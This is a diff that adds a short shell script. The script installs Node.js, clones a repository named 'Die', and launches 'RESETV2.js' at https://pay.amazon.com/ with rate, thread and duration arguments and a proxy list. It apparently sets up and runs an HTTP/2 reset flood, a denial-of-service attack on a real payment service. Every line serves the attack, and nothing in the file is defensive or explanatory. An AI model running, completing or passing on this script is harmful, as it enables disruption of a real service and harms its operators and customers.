@@ -1,0 +1,7 @@
+apt update && apt install -y curl git nodejs npm  
+npm install nude  
+apt install -y git  
+git clone https://github.com/raianosama/Die.git  
+cd Die  
+npm install user-agents axios net http2 tls cluster url path crypto fs https  
+node RESETV2.js https://pay.amazon.com/ 1000 8000 90 proxy.txt
